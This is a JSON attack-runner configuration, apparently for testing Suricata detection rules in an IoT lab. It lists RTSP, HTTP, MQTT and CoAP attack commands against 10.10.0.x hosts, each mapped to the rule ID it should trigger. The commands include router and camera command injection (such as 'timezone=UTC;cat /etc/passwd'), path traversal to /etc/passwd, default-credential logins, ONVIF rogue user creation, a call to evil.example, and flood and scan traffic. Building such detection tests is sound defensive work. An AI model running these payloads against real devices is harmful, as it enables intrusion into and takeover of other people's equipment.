{
  "fastlog": "/var/log/suricata/fast.log",
  "attacks": [
    {
      "id": "RTSP-1",
      "name": "RTSP: Multiple DESCRIBE requests (6x) to /stream1",
      "command": "bash -c 'for i in {1..6}; do printf \"DESCRIBE rtsp://10.10.0.6:8554/stream1 RTSP/1.0\\r\\nCSeq: %s\\r\\nUser-Agent: BA-AttackRunner\\r\\n\\r\\n\" \"$i\" | nc -w 2 10.10.0.6 8554 >/dev/null 2>&1; done'",
      "post_wait": 2,
      "expected_rulesid": [9000001]
    },
    {
      "id": "RTSP-2",
      "name": "RTSP: Path probing causing many 404 responses (triggers 9000002 detection_filter)",
      "command": "python3 - <<'PY'\nimport socket, time\nhost=\"10.10.0.6\"; port=8554\nmethod=\"DESCRIBE\"\npath=\"/nonexistent_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\nfull_url=True\nheaders={}\nbody=\"\"\nfor i in range(25):\n    target = f\"rtsp://{host}:{port}{path}\" if full_url else path\n    hdrs = dict(headers)\n    hdrs.setdefault(\"CSeq\", str(i+1))\n    hdrs.setdefault(\"User-Agent\", \"BA-AttackRunner\")\n    req = f\"{method} {target} RTSP/1.0\\r\\n\" + \"\".join(f\"{k}: {v}\\r\\n\" for k,v in hdrs.items()) + \"\\r\\n\"\n    payload = req.encode(\"utf-8\", errors=\"ignore\") + (body.encode(\"utf-8\", errors=\"ignore\") if body else b\"\")\n    s = socket.create_connection((host, port), timeout=3)\n    s.sendall(payload)\n    try:\n        s.recv(512)\n    except Exception:\n        pass\n    s.close()\n    time.sleep(0.02)\nPY",
      "post_wait": 2,
      "expected_rulesid": [
        9000002
      ]
    },
    {
      "id": "RTSP-3",
      "name": "RTSP: ANNOUNCE with overlong SDP attribute line (triggers 9000003)",
      "command": "python3 - <<'PY'\nimport socket\nhost=\"10.10.0.6\"; port=8554\npath=\"/stream\"\nvalue = \"A\"*220\nsdp = \"\\r\\n\".join([\n    \"v=0\",\n    \"o=- 0 0 IN IP4 127.0.0.1\",\n    \"s=-\",\n    \"t=0 0\",\n    f\"a=tool:{value}\",\n    \"\"\n])\nreq = (\n    f\"ANNOUNCE rtsp://{host}:{port}{path} RTSP/1.0\\r\\n\"\n    \"CSeq: 1\\r\\n\"\n    \"User-Agent: BA-AttackRunner\\r\\n\"\n    \"Content-Type: application/sdp\\r\\n\"\n    f\"Content-Length: {len(sdp.encode())}\\r\\n\"\n    \"\\r\\n\"\n    + sdp\n)\ns = socket.create_connection((host, port), timeout=3)\ns.sendall(req.encode(\"ascii\", errors=\"ignore\"))\ntry:\n    s.recv(512)\nexcept Exception:\n    pass\ns.close()\nPY",
      "post_wait": 2,
      "expected_rulesid": [
        9000003
      ]
    },
    {
      "id": "RTSP-4",
      "name": "RTSP: Path traversal in request-target (triggers 9000004)",
      "command": "python3 - <<'PY'\nimport socket, time\nhost=\"10.10.0.6\"; port=8554\nmethod=\"OPTIONS\"\npath=\"/%2e%2e%2f%2e%2e%2fetc/passwd\"\nfull_url=True\nheaders={}\nbody=\"\"\nfor i in range(1):\n    target = f\"rtsp://{host}:{port}{path}\" if full_url else path\n    hdrs = dict(headers)\n    hdrs.setdefault(\"CSeq\", str(i+1))\n    hdrs.setdefault(\"User-Agent\", \"BA-AttackRunner\")\n    req = f\"{method} {target} RTSP/1.0\\r\\n\" + \"\".join(f\"{k}: {v}\\r\\n\" for k,v in hdrs.items()) + \"\\r\\n\"\n    payload = req.encode(\"utf-8\", errors=\"ignore\") + (body.encode(\"utf-8\", errors=\"ignore\") if body else b\"\")\n    s = socket.create_connection((host, port), timeout=3)\n    s.sendall(payload)\n    try:\n        s.recv(512)\n    except Exception:\n        pass\n    s.close()\n    time.sleep(0.0)\nPY",
      "post_wait": 60,
      "expected_rulesid": [
        9000004
      ]
    },
    {
      "id": "RTSP-5",
      "name": "RTSP: Overlong Session header value (triggers 9000005)",
      "command": "longsession=$(openssl rand -base64 200); printf $'DESCRIBE rtsp://10.10.0.6:8554/stream1 RTSP/1.0\\r\\nCSeq: 3\\r\\nSession: %s\\r\\nUser-Agent: session-fuzz\\r\\n\\r\\n' \"$longsession\" | nc -N 10.10.0.6 8554",
      "post_wait": 2,
      "expected_rulesid": [9000005]
    },
    {
      "id": "TELNET-1",
      "name": "HTTP: GET /shell (triggers 9000006)",
      "command": "curl -s --max-time 3 http://10.10.0.3:80/shell",
      "post_wait": 2,
      "expected_rulesid": [
        9000006
      ]
    },
    {
      "id": "TELNET-2",
      "name": "IoT host: UDP burst to external IP (triggers 9000007 detection_filter)",
      "command": "docker exec telnet-device python3 -c \"import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=('1.1.1.1',12345); payload=b'A'*20; [s.sendto(payload, addr) for _ in range(150)]\"",
      "post_wait": 3,
      "expected_rulesid": [
        9000007
      ]
    },
    {
      "id": "TELNET-3",
      "name": "IoT host: TCP connect scan to internal host ports (triggers 9000008 detection_filter)",
      "command": "docker exec telnet-device nmap -sV -O 10.10.0.4",
      "post_wait": 3,
      "expected_rulesid": [9000008]
    },
    {
      "id": "ROUTER-1",
      "name": "Router: /login.cgi?cli= probe (triggers 9000009)",
      "command": "curl -s --max-time 3 'http://10.10.0.3:80/login.cgi?cli=whoami'",
      "post_wait": 2,
      "expected_rulesid": [
        9000009
      ]
    },
    {
      "id": "ROUTER-2",
      "name": "Router: ?images auth-bypass probe (triggers 9000010)",
      "command": "curl -s --max-time 3 'http://10.10.0.3:80/?images'",
      "post_wait": 2,
      "expected_rulesid": [
        9000010
      ]
    },
    {
      "id": "ROUTER-3",
      "name": "Router: TR-064 NewNTPServer=http://... (triggers 9000011)",
      "command": "curl -s --max-time 3 -X POST -H 'Content-Type: text/xml; charset=utf-8' --data '<NewNTPServer>http://evil.example/ntp</NewNTPServer>' http://10.10.0.3:7547/",
      "post_wait": 2,
      "expected_rulesid": [
        9000011
      ]
    },
    {
      "id": "ROUTER-4",
      "name": "Router: TOTOLINK downloadFlile.cgi payload injection (triggers 9000012 + 9000013)",
      "command": "curl -s --max-time 3 'http://10.10.0.3:80/cgi-bin/downloadFlile.cgi?payload=%60id%60'",
      "post_wait": 2,
      "expected_rulesid": [
        9000012,
        9000013
      ]
    },
    {
      "id": "ROUTER-4.1",
      "name": "Router: TOTOLINK downloadFile.cgi payload injection (triggers 9000014)",
      "command": "curl -s --max-time 3 'http://10.10.0.3:80/cgi-bin/downloadFile.cgi?payload=%60id%60'",
      "post_wait": 2,
      "expected_rulesid": [
        9000014
      ]
    },
    {
      "id": "ROUTER-5",
      "name": "Router: TP-Link country=... command injection pattern (triggers 9000015)",
      "command": "curl -s --max-time 3 'http://10.10.0.3:80/?country=DE%3Bid'",
      "post_wait": 2,
      "expected_rulesid": [
        9000015
      ]
    },
    {
      "id": "ROUTER-6",
      "name": "Router: Tenda WriteFacMac mac=... injection pattern (triggers 9000016)",
      "command": "curl -s --max-time 3 'http://10.10.0.3:80/goform/WriteFacMac?mac=AA:BB:CC:DD:EE:FF%3Bid'",
      "post_wait": 2,
      "expected_rulesid": [
        9000016
      ]
    },
    {
      "id": "ROUTER-7",
      "name": "Router: timezone injection (triggers 9000017)",
      "command": "curl -s --max-time 3 -X POST 'http://10.10.0.3/apply.cgi' --data-urlencode 'timezone=UTC;cat /etc/passwd'",
      "post_wait": 2,
      "expected_rulesid": [9000017]
    },
    {
      "id": "CAM-1",
      "name": "Camera: Default BasicAuth admin:admin (triggers 9000018)",
      "command": "curl -s --max-time 3 -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://10.10.0.4:80/",
      "post_wait": 2,
      "expected_rulesid": [
        9000018
      ]
    },
    {
      "id": "CAM-2",
      "name": "Camera: GET /system.ini (triggers 9000019)",
      "command": "curl -s --max-time 3 http://10.10.0.4:80/system.ini",
      "post_wait": 2,
      "expected_rulesid": [
        9000019
      ]
    },
    {
      "id": "CAM-3",
      "name": "Camera: ONVIF SOAP CreateUsers (triggers 9000020)",
      "command": "python3 - <<'PY'\nimport socket\nhost=\"10.10.0.4\"; port=80\npath=\"/onvif/device_service\"\nnonce = \"A\"*32 + \"==\"\nxml = f'''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"\n            xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\">\n  <s:Header>\n    <wsse:Security>\n      <wsse:UsernameToken>\n        <wsse:Username>admin</wsse:Username>\n        <wsse:Password>admin</wsse:Password>\n        <wsse:Nonce>{nonce}</wsse:Nonce>\n      </wsse:UsernameToken>\n    </wsse:Security>\n  </s:Header>\n  <s:Body>\n    <CreateUsers>\n      <User>\n        <Username>evil</Username>\n        <Password>evil</Password>\n      </User>\n    </CreateUsers>\n  </s:Body>\n</s:Envelope>\n'''\nreq = (\n    f\"POST {path} HTTP/1.1\\r\\n\"\n    f\"Host: {host}\\r\\n\"\n    \"User-Agent: BA-AttackRunner\\r\\n\"\n    \"Connection: close\\r\\n\"\n    \"Content-Type: application/soap+xml; charset=utf-8\\r\\n\"\n    f\"Content-Length: {len(xml.encode())}\\r\\n\"\n    \"\\r\\n\"\n    + xml\n)\ns = socket.create_connection((host, port), timeout=3)\ns.sendall(req.encode(\"utf-8\", errors=\"ignore\"))\ntry:\n    s.recv(512)\nexcept Exception:\n    pass\ns.close()\nPY",
      "post_wait": 2,
      "expected_rulesid": [
        9000020
      ]
    },
    {
      "id": "CAM-4",
      "name": "Camera: POST /res.php action=alarm with metachar (triggers 9000021)",
      "command": "curl -s -X POST http://10.10.0.4/res.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=alarm&id=1;uname -a'",
      "post_wait": 2,
      "expected_rulesid": [9000021]
    },
    {
      "id": "MQTT-1",
      "name": "MQTT: single CONNECT from external (triggers 9000022)",
      "command": "python3 - <<'PY'\nimport socket, random, string\nhost=\"10.10.0.5\"; port=1883\ncid = \"ba-connect\"\ndef enc_str(s):\n    b=s.encode()\n    return bytes([len(b)>>8, len(b)&0xff]) + b\ndef rem_len(n):\n    out=bytearray()\n    x=n\n    while True:\n        digit=x%128\n        x//=128\n        if x>0: digit |= 0x80\n        out.append(digit)\n        if x==0: break\n    return bytes(out)\nvh = b\"\\x00\\x04MQTT\\x04\" + bytes([0x02]) + b\"\\x00\\x3c\"\npayload = enc_str(cid)\npkt = b\"\\x10\" + rem_len(len(vh)+len(payload)) + vh + payload\ns=socket.create_connection((host,port), timeout=3)\ns.sendall(pkt)\ntry: s.recv(4)\nexcept Exception: pass\ns.close()\nPY",
      "post_wait": 2,
      "expected_rulesid": [
        9000022
      ]
    },
    {
      "id": "MQTT-2",
      "name": "MQTT: CONNECT flood (triggers 9000023 detection_filter)",
      "command": "python3 - <<'PY'\nimport socket, time, random, string\nhost=\"10.10.0.5\"; port=1883\ndef rand_cid():\n    suf=\"\".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(8))\n    return \"ba-flood-\"+suf\ndef enc_str(s):\n    b=s.encode()\n    return bytes([len(b)>>8, len(b)&0xff]) + b\ndef rem_len(n):\n    out=bytearray()\n    x=n\n    while True:\n        digit=x%128\n        x//=128\n        if x>0: digit |= 0x80\n        out.append(digit)\n        if x==0: break\n    return bytes(out)\nvh = b\"\\x00\\x04MQTT\\x04\" + bytes([0x02]) + b\"\\x00\\x3c\"\nfor i in range(12):\n    cid = rand_cid()\n    payload = enc_str(cid)\n    pkt = b\"\\x10\" + rem_len(len(vh)+len(payload)) + vh + payload\n    s=socket.create_connection((host,port), timeout=3)\n    s.sendall(pkt)\n    try: s.recv(4)\n    except Exception: pass\n    s.close()\n    time.sleep(0.0)\nPY",
      "post_wait": 2,
      "expected_rulesid": [
        9000023
      ]
    },
    {
      "id": "MQTT-3",
      "name": "MQTT: PUBLISH to exec/server with debug exec (triggers 9000024)",
      "command": "python3 - <<'PY'\nimport socket\nhost=\"10.10.0.5\"; port=1883\ntopic=\"acme/device/dev123/exec/server\"\nmessage=\"debug exec\"\nclient_id=\"ba-pub\"\n\ndef enc_str(s):\n    b=s.encode()\n    return bytes([len(b)>>8, len(b)&0xff]) + b\ndef rem_len(n):\n    out=bytearray()\n    x=n\n    while True:\n        digit=x%128\n        x//=128\n        if x>0: digit |= 0x80\n        out.append(digit)\n        if x==0: break\n    return bytes(out)\n\nvh = b\"\\x00\\x04MQTT\\x04\" + bytes([0x02]) + b\"\\x00\\x3c\"\npl = enc_str(client_id)\nconnect = b\"\\x10\" + rem_len(len(vh)+len(pl)) + vh + pl\n\nt = enc_str(topic)\nm = message.encode()\npublish = b\"\\x30\" + rem_len(len(t)+len(m)) + t + m\n\ns=socket.create_connection((host,port), timeout=3)\ns.sendall(connect)\ntry: s.recv(4)\nexcept Exception: pass\ns.sendall(publish)\ntry:\n    s.shutdown(socket.SHUT_WR)\nexcept Exception:\n    pass\ns.close()\nPY",
      "post_wait": 2,
      "expected_rulesid": [
        9000024
      ]
    },
    {
      "id": "COAP-1",
      "name": "CoAP: POST payload with cmd=... (triggers 9000025)",
      "command": "python3 - <<'PY'\nimport socket, random\nhost=\"10.10.0.5\"; port=5683\nmid = random.randint(0, 0xFFFF)\nhdr = bytes([0x40, 0x02, (mid>>8)&0xff, mid&0xff])  # Ver=1, Type=CON, TKL=0, Code=POST\npayload = b\"\\xff\" + (\"cmd=id\".encode())\npkt = hdr + payload\ns=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.sendto(pkt, (host, port))\ns.close()\nPY",
      "post_wait": 2,
      "expected_rulesid": [
        9000025
      ]
    }
  ]
}